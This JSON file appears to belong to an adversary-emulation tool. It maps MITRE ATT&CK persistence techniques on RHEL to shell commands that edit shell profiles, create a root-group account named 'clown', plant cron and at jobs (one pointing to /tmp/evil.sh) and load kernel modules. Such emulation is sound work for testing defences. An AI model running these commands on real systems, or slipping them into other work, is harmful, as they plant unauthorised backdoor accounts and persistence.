{
  "commands": [
    {
      "tactic_id": "T1098.004",
      "technique": "Persistence: SSH Authorized Keys",
      "command": "bash Dependencies/SSHAuthorizedKey.sh"
    },
    {
      "tactic_id": "T1543.002",
      "technique": "Persistence: Create or Modify System Process",
      "command": "bash Dependencies/CreateorModifySystemProcess.sh"
    },
    {
      "tactic_id": "T1037.004",
      "technique": "Persistence: Boot or Logon Initialization Scripts",
      "command": "bash Dependencies/BootorLogon.sh"
    },
    {
      "tactic_id": "T1546.004",
      "technique": "Event Triggered Execution",
      "command": "mkdir -p Output/Persistence_RHEL && echo 'echo \"Hello from SISA T1546.004\" > /tmp/T1546.004' >> ~/.bash_profile && echo 'echo \"Hello from SISA T1546.004\" > /tmp/T1546.004' >> ~/.bashrc && echo '# Hello from SISA T1546.004' | sudo tee -a /etc/profile > /dev/null && echo '# SISA was here... T1546.004' >> ~/.profile && echo '# SISA was here... T1546.004' | sudo tee -a /etc/profile.d/bash_completion.sh > /dev/null && sudo useradd --create-home --shell /bin/bash art && sudo su -c 'echo \"echo \\\"SISA was here... T1546.004\\\" >> $HOME/art.txt\" >> /home/art/.bash_logout' art && echo 'All T1546.004 persistence methods completed.' >> Output/Persistence_RHEL/T1546.004_Persistence.txt"
    },
    {
      "tactic_id": "T1136.001",
      "technique": "Create Account: Local Account",
      "command": "sudo useradd -g 0 -M -d /root -s /bin/bash clown"
    },
    {
      "tactic_id": "T1053.002",
      "technique": "Scheduled Task/Job: At",
      "command": "mkdir -p Output/Persistence_RHEL && (systemctl start atd || service atd start) && echo 'echo Hello from SISA' | at 'now + 1 minute' > Output/Persistence_RHEL/T1053.002_Execution.txt 2>&1 && echo 'Job scheduled to run at now + 1 minute.' >> Output/Persistence_RHEL/T1053.002_Execution.txt"
    },
    {
      "tactic_id": "T1053.003",
      "technique": "Scheduled Task/Job: Cron",
      "command": "sudo systemctl start crond || sudo systemctl start cron && sudo systemctl enable crond || sudo systemctl enable cron && sudo crontab -l > /tmp/notevil && echo '* * * * * /tmp/evil.sh' | sudo tee /tmp/persistevil > /dev/null && sudo crontab /tmp/persistevil && echo \"echo 'Hello from SISA Team' > /tmp/SISA.log\" | sudo tee /etc/cron.daily/persistevil /etc/cron.hourly/persistevil /etc/cron.monthly/persistevil /etc/cron.weekly/persistevil > /dev/null && echo '*/5 * * * * root echo \"Hello from SISA Team\" > /tmp/SISA.log' | sudo tee /etc/cron.d/persistevil > /dev/null && (sudo crontab -l 2>/dev/null; echo \"*/5 * * * * echo 'Hello from SISA Team' > /tmp/SISA.log\") | sudo crontab -"
    },
    {
      "tactic_id": "T1053.003-2",
      "technique": "Persistence - Scheduled Task/Job: Cron",
      "command": "echo -e '#!/bin/bash\\necho \"Job ran at \\$(date)\" >> \\$HOME/cronlog.txt' > \\\"\\$HOME/testcron.sh\\\" && chmod +x \\\"\\$HOME/testcron.sh\\\" && (crontab -l 2>/dev/null; echo \\\"*/2 * * * * \\$HOME/testcron.sh\\\") | crontab - && crontab -l && echo \\\"Waiting for cron job... (check \\$HOME/cronlog.txt)\\\" && tail -f \\\"\\$HOME/cronlog.txt\\\""

    },
    {
      "tactic_id": "T1053.003-3",
      "technique": "Persistence - Scheduled Task/Job: Cron - Remove cron job and cleanup",
      "command": "crontab -l | grep -v \"$HOME/testcron.sh\" | crontab - && rm -f \"$HOME/testcron.sh\" \"$HOME/cronlog.txt\""
    },
    {
      "tactic_id": "T1547.006",
      "technique": "Persistence - Boot or Logon Autostart Execution: Kernel Modules and Extensions",
      "command": "MODULE_NAME=\"e1000e\" && MODULE_PATH=\"/lib/modules/$(uname -r)/kernel/drivers/net/ethernet/intel/${MODULE_NAME}/${MODULE_NAME}.ko\" && [[ -f \"$MODULE_PATH\" ]] && sudo insmod \"$MODULE_PATH\" && lsmod | grep -q \"^${MODULE_NAME}\" && echo \"[+] Module '${MODULE_NAME}' successfully loaded.\" || echo \"[!] Failed to load module '${MODULE_NAME}'.\" && read -p \"[*] Press ENTER to remove the module...\" && sudo rmmod \"$MODULE_NAME\" && lsmod | grep -q \"^${MODULE_NAME}\" && echo \"[!] Module '${MODULE_NAME}' could not be removed.\" || echo \"[+] Module '${MODULE_NAME}' removed successfully.\""
    },
    {
      "tactic_id": "T1098.003",
      "technique": "Persistence - Account Manipulation: Add User to Privileged Group",
      "command": "getent group fakeadmin > /dev/null || groupadd fakeadmin; id fakeuser > /dev/null 2>&1 || useradd -m fakeuser; id -nG fakeuser | grep -qw fakeadmin || usermod -aG fakeadmin fakeuser; gpasswd -d fakeuser fakeadmin 2>/dev/null; id fakeuser > /dev/null 2>&1 && userdel -r fakeuser; getent group fakeadmin > /dev/null && groupdel fakeadmin"
    }
  ]
}
 
